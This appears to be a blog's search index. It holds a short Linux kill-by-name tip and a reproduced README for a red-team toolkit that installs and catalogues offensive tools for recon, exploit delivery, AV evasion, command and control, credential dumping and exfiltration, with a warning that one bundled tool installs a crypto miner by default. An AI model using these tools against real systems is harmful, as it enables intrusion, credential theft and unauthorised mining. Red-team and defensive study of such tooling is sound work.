<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[linux 常用命令]]></title>
    <url>%2F2019%2F04%2F08%2FLinux%20command.html</url>
    <content type="text"><![CDATA[Linux 常用命令操作 温故而知新 12kill -9 `ps -ef|grep apache2|grep -v grep|awk &apos;&#123;print $2&#125;&apos; `指定进程名执行 kill命令]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redteam Toolkit]]></title>
    <url>%2F2019%2F04%2F07%2FRedteam%20Toolkit.html</url>
    <content type="text"><![CDATA[This tool kit is very much influenced by infosecn1nja’s kit.Use this script to grab majority of the repos. NOTE: hard coded in /opt and made for Kali Linux Total Size (so far): 2.5+Gb Install Guide:123git clone https://github.com/shr3ddersec/Shr3dKit.gitpip install -r requirements.txtbash shr3dkit.sh Change Log1234Fixed: macro_pack, LaZagneCode: Added all requirements to script, seperated pip requirements and merged to one file.Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion Phantom Evasion Forewarning Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason. To disable, please change Miner=False in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab. Contents Reconnaissance Weaponization Delivery Command and Control Lateral Movement Establish Foothold Escalate Privileges Data Exfiltration Misc References ReconnaissanceActive Intelligence Gathering EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. https://github.com/ChrisTruncer/EyeWitness AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for loot. https://github.com/jordanpotti/AWSBucketDump AQUATONE is a set of tools for performing reconnaissance on domain names. https://github.com/michenriksen/aquatone spoofcheck a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. https://github.com/BishopFox/spoofcheck Nmap is used to discover hosts and services on a computer network, thus building a “map” of the network. https://github.com/nmap/nmap dnsrecon a tool DNS Enumeration Script. https://github.com/darkoperator/dnsrecon Passive Intelligence Gathering Social Mapper OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. https://github.com/SpiderLabs/social_mapper skiptracer OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. https://github.com/xillwillx/skiptracer ScrapedIn a tool to scrape LinkedIn without API restrictions for data reconnaissance. https://github.com/dchrastil/ScrapedIn linkScrape A LinkedIn user/company enumeration tool. https://github.com/NickSanzotta/linkScrape FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. https://github.com/ElevenPaths/FOCA theHarvester is a tool for gathering subdomain names, e-mail addresses, virtualhosts, open ports/ banners, and employee names from different public sources. https://github.com/laramies/theHarvester Metagoofil is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. https://github.com/laramies/metagoofil SimplyEmail Email recon made fast and easy, with a framework to build on. https://github.com/killswitch-GUI/SimplyEmail truffleHog searches through git repositories for secrets, digging deep into commit history and branches. https://github.com/dxa4481/truffleHog Just-Metadata is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. https://github.com/ChrisTruncer/Just-Metadata typofinder a finder of domain typos showing country of IP address. https://github.com/nccgroup/typofinder pwnedOrNot is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. https://github.com/thewhiteh4t/pwnedOrNot GitHarvester This tool is used for harvesting information from GitHub like google dork. https://github.com/metac0rtex/GitHarvester pwndb is a python command-line tool for searching leaked credentials using the Onion service with the same name. https://github.com/davidtavarez/pwndb/ Frameworks Maltego is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. https://www.paterva.com/web7/downloads.php SpiderFoot the open source footprinting and intelligence-gathering tool. https://github.com/smicallef/spiderfoot datasploit is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. https://github.com/DataSploit/datasploit Recon-ng is a full-featured Web Reconnaissance framework written in Python. https://bitbucket.org/LaNMaSteR53/recon-ng Weaponization Composite Moniker Proof of Concept exploit for CVE-2017-8570. https://github.com/rxwx/CVE-2017-8570 Exploit toolkit CVE-2017-8759 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. https://github.com/bhdresh/CVE-2017-8759 CVE-2017-11882 Exploit accepts over 17k bytes long command/code in maximum. https://github.com/unamer/CVE-2017-11882 Adobe Flash Exploit CVE-2018-4878. https://github.com/anbai-inc/CVE-2018-4878 Exploit toolkit CVE-2017-0199 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. https://github.com/bhdresh/CVE-2017-0199 demiguise is a HTA encryption tool for RedTeams. https://github.com/nccgroup/demiguise Office-DDE-Payloads collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads CACTUSTORCH Payload Generation for Adversary Simulations. https://github.com/mdsecactivebreach/CACTUSTORCH SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. https://github.com/mdsecactivebreach/SharpShooter Don’t kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. https://github.com/Mr-Un1k0d3r/DKMC Malicious Macro Generator Utility Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator SCT Obfuscator Cobalt Strike SCT payload obfuscator. https://github.com/Mr-Un1k0d3r/SCT-obfuscator Invoke-Obfuscation PowerShell Obfuscator. https://github.com/danielbohannon/Invoke-Obfuscation Invoke-DOSfuscation cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. https://github.com/danielbohannon/Invoke-DOSfuscation morphHTA Morphing Cobalt Strike’s evil.HTA. https://github.com/vysec/morphHTA Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. https://github.com/trustedsec/unicorn Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. https://www.shellterproject.com/ EmbedInHTML Embed and hide any file in an HTML file. https://github.com/Arno0x/EmbedInHTML SigThief Stealing Signatures and Making One Invalid Signature at a Time. https://github.com/secretsquirrel/SigThief Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. https://github.com/Veil-Framework/Veil CheckPlease Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. https://github.com/Arvanaghi/CheckPlease Invoke-PSImage is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. https://github.com/peewpw/Invoke-PSImage LuckyStrike a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. https://github.com/curi0usJack/luckystrike ClickOnceGenerator Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. https://github.com/Mr-Un1k0d3r/ClickOnceGenerator macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. https://github.com/sevagas/macro_pack StarFighters a JavaScript and VBScript Based Empire Launcher. https://github.com/Cn33liz/StarFighters nps_payload this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. https://github.com/trustedsec/nps_payload SocialEngineeringPayloads a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. https://github.com/bhdresh/SocialEngineeringPayloads The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. https://github.com/trustedsec/social-engineer-toolkit Phishery is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication. https://github.com/ryhanson/phishery PowerShdll run PowerShell with rundll32. Bypass software restrictions. https://github.com/p3nt4/PowerShdll Ultimate AppLocker ByPass List The goal of this repository is to document the most common techniques to bypass AppLocker. https://github.com/api0cradle/UltimateAppLockerByPassList Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. https://github.com/sensepost/ruler Generate-Macro is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. https://github.com/enigma0x3/Generate-Macro Malicious Macro MSBuild Generator Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. https://github.com/infosecn1nja/MaliciousMacroMSBuild Meta Twin is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. https://github.com/threatexpress/metatwin WePWNise generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. https://github.com/mwrlabs/wePWNise DotNetToJScript a tool to create a JScript file which loads a .NET v2 assembly from memory. https://github.com/tyranid/DotNetToJScript PSAmsi is a tool for auditing and defeating AMSI signatures. https://github.com/cobbr/PSAmsi Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. https://github.com/stephenfewer/ReflectiveDLLInjection ps1encode use to generate and encode a powershell based metasploit payloads. https://github.com/CroweCybersecurity/ps1encode Worse PDF turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. https://github.com/3gstudent/Worse-PDF SpookFlare has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. https://github.com/hlldz/SpookFlare GreatSCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. https://github.com/GreatSCT/GreatSCT nps running powershell without powershell. https://github.com/Ben0xA/nps Meterpreter_Paranoid_Mode.sh allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL The Backdoor Factory (BDF) is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. https://github.com/secretsquirrel/the-backdoor-factory MacroShop a collection of scripts to aid in delivering payloads via Office Macros. https://github.com/khr0x40sh/MacroShop UnmanagedPowerShell Executes PowerShell from an unmanaged process. https://github.com/leechristensen/UnmanagedPowerShell evil-ssdp Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. https://gitlab.com/initstring/evil-ssdp Ebowla Framework for Making Environmental Keyed Payloads. https://github.com/Genetic-Malware/Ebowla make-pdf-embedded a tool to create a PDF document with an embedded file. https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py avet (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. https://github.com/govolution/avet Phantom-Evasion Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). https://github.com/oddcod3/Phantom-Evasion WARNING: Please be aware this does install a Minero miner by default. This can be changed in the Setup folder and edit Config.txt and edit Mining = False. If you want to support the project and developers, I would recommend keeping on. DeliveryPhishing King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. https://github.com/securestate/king-phisher FiercePhish is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. https://github.com/Raikia/FiercePhish ReelPhish is a Real-Time Two-Factor Phishing Tool. https://github.com/fireeye/ReelPhish/ Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. https://github.com/gophish/gophish CredSniper is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. https://github.com/ustayready/CredSniper PwnAuth a web application framework for launching and managing OAuth abuse campaigns. https://github.com/fireeye/PwnAuth Phishing Frenzy Ruby on Rails Phishing Framework. https://github.com/pentestgeek/phishing-frenzy Phishing Pretexts a library of pretexts to use on offensive phishing engagements. https://github.com/L4bF0x/PhishingPretexts Modlishka is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. https://github.com/drk1wi/Modlishka Watering Hole Attack BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. https://github.com/beefproject/beef Command and ControlRemote Access Tools Cobalt Strike is software for Adversary Simulations and Red Team Operations. https://cobaltstrike.com/ Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. https://github.com/EmpireProject/Empire Metasploit Framework is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. https://github.com/rapid7/metasploit-framework SILENTTRINITY A post-exploitation agent powered by Python, IronPython, C#/.NET. https://github.com/byt3bl33d3r/SILENTTRINITY Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. https://github.com/n1nj4sec/pupy Koadic or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. https://github.com/zerosum0x0/koadic PoshC2 is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. https://github.com/nettitude/PoshC2 Gcat a stealthy Python based backdoor that uses Gmail as a command and control server. https://github.com/byt3bl33d3r/gcat TrevorC2 is a legitimate website (browsable) that tunnels client/server communications for covert command execution. https://github.com/trustedsec/trevorc2 Merlin is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. https://github.com/Ne0nd0g/merlin Quasar is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. https://github.com/quasar/QuasarRAT Staging Rapid Attack Infrastructure (RAI) Red Team Infrastructure… Quick… Fast… SimplifiedOne of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entailsa teamserver or controller, domains, redirectors, and a Phishing server. https://github.com/obscuritylabs/RAI Red Baron is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. https://github.com/byt3bl33d3r/Red-Baron EvilURL generate unicode evil domains for IDN Homograph Attack and detect them. https://github.com/UndeadSec/EvilURL Domain Hunter checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. https://github.com/threatexpress/domainhunter PowerDNS is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. https://github.com/mdsecactivebreach/PowerDNS Chameleon a tool for evading Proxy categorisation. https://github.com/mdsecactivebreach/Chameleon CatMyFish Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&amp;C. https://github.com/Mr-Un1k0d3r/CatMyFish Malleable C2 is a domain specific language to redefine indicators in Beacon’s communication. https://github.com/rsmudge/Malleable-C2-Profiles Malleable-C2-Randomizer This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. https://github.com/bluscreenofjeff/Malleable-C2-Randomizer FindFrontableDomains search for potential frontable domains. https://github.com/rvrsh3ll/FindFrontableDomains Postfix-Server-Setup Setting up a phishing server is a very long and tedious process. It can take hours to setup, and can be compromised in minutes. https://github.com/n0pe-sled/Postfix-Server-Setup DomainFrontingLists a list of Domain Frontable Domains by CDN. https://github.com/vysec/DomainFrontingLists Apache2-Mod-Rewrite-Setup Quickly Implement Mod-Rewrite in your infastructure. https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup mod_rewrite rule to evade vendor sandboxes. https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10 external_c2 framework a python framework for usage with Cobalt Strike’s External C2. https://github.com/Und3rf10w/external_c2_framework ExternalC2 a library for integrating communication channels with the Cobalt Strike External C2 server. https://github.com/ryhanson/ExternalC2 cs2modrewrite a tools for convert Cobalt Strike profiles to modrewrite scripts. https://github.com/threatexpress/cs2modrewrite e2modrewrite a tools for convert Empire profiles to Apache modrewrite scripts. https://github.com/infosecn1nja/e2modrewrite redi automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). https://github.com/taherio/redi Domain Fronting Google App Engine. https://github.com/redteam-cyberark/Google-Domain-fronting DomainFrontDiscover Scripts and results for finding domain frontable CloudFront domains. https://github.com/peewpw/DomainFrontDiscover Automated Empire Infrastructure https://github.com/bneg/RedTeam-Automation Serving Random Payloads with NGINX. https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9 meek is a blocking-resistant pluggable transport for Tor. It encodes adata stream as a sequence of HTTPS requests and responses. https://github.com/arlolra/meek CobaltStrike-ToolKit Some useful scripts for CobaltStrike. https://github.com/killswitch-GUI/CobaltStrike-ToolKit mkhtaccess_red Auto-generate an HTaccess for payload delivery – automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. https://github.com/violentlydave/mkhtaccess_red RedFile a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. https://github.com/outflanknl/RedFile keyserver Easily serve HTTP and DNS keys for proper payload protection. https://github.com/leoloobeek/keyserver DoHC2 allows the ExternalC2 library from Ryan Hanson (https://github.com/ryhanson/ExternalC2) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (https://www.cobaltstrike.com). https://github.com/SpiderLabs/DoHC2 cat-sites Library of sites for categorization. https://github.com/audrummer15/cat-sites Lateral Movement CrackMapExec is a swiss army knife for pentesting networks. https://github.com/byt3bl33d3r/CrackMapExec PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. https://github.com/Mr-Un1k0d3r/PowerLessShell GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application. https://github.com/GoFetchAD/GoFetch ANGRYPUPPY a bloodhound attack path automation in CobaltStrike. https://github.com/vysec/ANGRYPUPPY DeathStar is a Python script that uses Empire’s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. https://github.com/byt3bl33d3r/DeathStar SharpHound C# Rewrite of the BloodHound Ingestor. https://github.com/BloodHoundAD/SharpHound BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. https://github.com/fox-it/BloodHound.py Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. https://github.com/SpiderLabs/Responder SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. https://github.com/fireeye/SessionGopher PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. https://github.com/PowerShellMafia/PowerSploit Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. https://github.com/samratashok/nishang Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. https://github.com/Kevin-Robertson/Inveigh PowerUpSQL a PowerShell Toolkit for Attacking SQL Server. https://github.com/NetSPI/PowerUpSQL MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). https://github.com/dafthack/MailSniper WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. It’s designed primarily for use on penetration tests or red team engagements. https://github.com/ChrisTruncer/WMIOps Mimikatz is an open-source utility that enables the viewing of credential information from the Windows lsass. https://github.com/gentilkiwi/mimikatz LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. https://github.com/AlessandroZ/LaZagne mimipenguin a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. https://github.com/huntergregal/mimipenguin PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. https://docs.microsoft.com/en-us/sysinternals/downloads/psexec KeeThief allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. https://github.com/HarmJ0y/KeeThief PSAttack combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. https://github.com/jaredhaight/PSAttack Internal Monologue Attack Retrieving NTLM Hashes without Touching LSASS. https://github.com/eladshamir/Internal-Monologue Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. https://github.com/CoreSecurity/impacket icebreaker gets plaintext Active Directory credentials if you’re on the internal network but outside the AD environment. https://github.com/DanMcInerney/icebreaker Living Off The Land Binaries and Scripts (and now also Libraries) The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. https://github.com/api0cradle/LOLBAS WSUSpendu for compromised WSUS server to extend the compromise to clients. https://github.com/AlsidOfficial/WSUSpendu Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. https://github.com/infobyte/evilgrade NetRipper is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. https://github.com/NytroRST/NetRipper LethalHTA Lateral Movement technique using DCOM and HTA. https://github.com/codewhitesec/LethalHTA Invoke-PowerThIEf an Internet Explorer Post Exploitation library. https://github.com/nettitude/Invoke-PowerThIEf RedSnarf is a pen-testing / red-teaming tool for Windows environments. https://github.com/nccgroup/redsnarf HoneypotBuster Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. https://github.com/JavelinNetworks/HoneypotBuster Establish Foothold Tunna is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. https://github.com/SECFORCE/Tunna reGeorg the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. https://github.com/sensepost/reGeorg Blade is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. https://github.com/wonderqs/Blade TinyShell Web Shell Framework. https://github.com/threatexpress/tinyshell PowerLurk is a PowerShell toolset for building malicious WMI Event Subsriptions. https://github.com/Sw4mpf0x/PowerLurk DAMP The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.https://github.com/HarmJ0y/DAMP Escalate PrivilegesDomain Escalation PowerView is a PowerShell tool to gain network situational awareness on Windows domains. https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 Get-GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Invoke-ACLpwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. https://github.com/fox-it/Invoke-ACLPwn BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. https://github.com/BloodHoundAD/BloodHound PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek Grouper a PowerShell script for helping to find vulnerable settings in AD Group Policy.https://github.com/l0ss/Grouper ADRecon is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. https://github.com/sense-of-security/ADRecon ADACLScanner one script for ACL’s in Active Directory. https://github.com/canix1/ADACLScanner LAPSToolkit a tool to audit and attack LAPS environments. https://github.com/leoloobeek/LAPSToolkit PingCastle is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. https://www.pingcastle.com/download RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). https://github.com/cyberark/RiskySPN Mystique is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. https://github.com/machosec/Mystique Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy’s Kekeo project. https://github.com/GhostPack/Rubeus kekeo is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). https://github.com/gentilkiwi/kekeo Local Escalation UACMe is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. https://github.com/hfiref0x/UACME windows-kernel-exploits a collection windows kernel exploit. https://github.com/SecWiki/windows-kernel-exploits PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload. https://github.com/rsmudge/ElevateKit Sherlock a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. https://github.com/rasta-mouse/Sherlock Tokenvator a tool to elevate privilege with Windows Tokens. https://github.com/0xbadjuju/Tokenvator Data Exfiltration CloakifyFactory &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. https://github.com/TryCatchHCF/Cloakify DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. https://github.com/sensepost/DET DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. https://github.com/Arno0x/DNSExfiltrator PyExfil a Python Package for Data Exfiltration. https://github.com/ytisf/PyExfil Egress-Assess is a tool used to test egress data detection capabilities. https://github.com/ChrisTruncer/Egress-Assess Powershell RAT python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. https://github.com/Viralmaniar/Powershell-RAT MiscWireless Networks Wifiphisher is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. https://github.com/wifiphisher/wifiphisher Evilginx is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. https://github.com/kgretzky/evilginx mana toolkit for wifi rogue AP attacks and MitM. https://github.com/sensepost/mana Embedded &amp; Peripheral Devices Hacking magspoof a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card “wirelessly”, even on standard magstripe (non-NFC/RFID) readers. https://github.com/samyk/magspoof WarBerryPi was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. https://github.com/secgroundzero/warberry P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). https://github.com/mame82/P4wnP1 malusb HID spoofing multi-OS payload for Teensy. https://github.com/ebursztein/malusb Fenrir is a tool designed to be used “out-of-the-box” for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. https://github.com/Orange-Cyberdefense/fenrir-ocd poisontap exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. https://github.com/samyk/poisontap WHID WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.https://github.com/whid-injector/WHID Software For Team Communication RocketChat is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. https://rocket.chat Etherpad is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document https://etherpad.net Log Aggregation RedELK Red Team’s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. https://github.com/outflanknl/RedELK/ CobaltSplunk Splunk Dashboard for CobaltStrike logs. https://github.com/vysec/CobaltSplunk Red Team Telemetry A collection of scripts and configurations to enable centralized logging of red team infrastructure. https://github.com/ztgrace/red_team_telemetry Elastic for Red Teaming Repository of resources for configuring a Red Team SIEM using Elastic. https://github.com/SecurityRiskAdvisors/RedTeamSIEM C# Offensive Framework SharpSploit is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. https://github.com/cobbr/SharpSploit GhostPack is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. https://github.com/GhostPack SharpWeb .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. https://github.com/djhohnstein/SharpWeb reconerator C# Targeted Attack Reconnissance Tools. https://github.com/stufus/reconerator SharpView C# implementation of harmj0y’s PowerView. https://github.com/tevora-threat/SharpView Watson is a (.NET 2.0 compliant) C# implementation of Sherlock. https://github.com/rasta-mouse/Watson Labs Detection Lab This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. https://github.com/clong/DetectionLab Modern Windows Attacks and Defense Lab This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. https://github.com/jaredhaight/WindowsAttackAndDefenseLab Invoke-UserSimulator Simulates common user behaviour on local and remote Windows hosts. https://github.com/ubeeri/Invoke-UserSimulator Invoke-ADLabDeployer Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. https://github.com/outflanknl/Invoke-ADLabDeployer Sheepl Creating realistic user behaviour for supporting tradecraft development within lab environments. https://github.com/SpiderLabs/sheepl Scripts Aggressor Scripts is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots. https://github.com/invokethreatguy/CSASC https://github.com/secgroundzero/CS-Aggressor-Scripts https://github.com/Und3rf10w/Aggressor-scripts https://github.com/harleyQu1nn/AggressorScripts https://github.com/rasta-mouse/Aggressor-Script https://github.com/RhinoSecurityLabs/Aggressor-Scripts https://github.com/bluscreenofjeff/AggressorScripts https://github.com/001SPARTaN/aggressor_scripts https://github.com/360-A-Team/CobaltStrike-Toolset A collection scripts useful for red teaming and pentesting 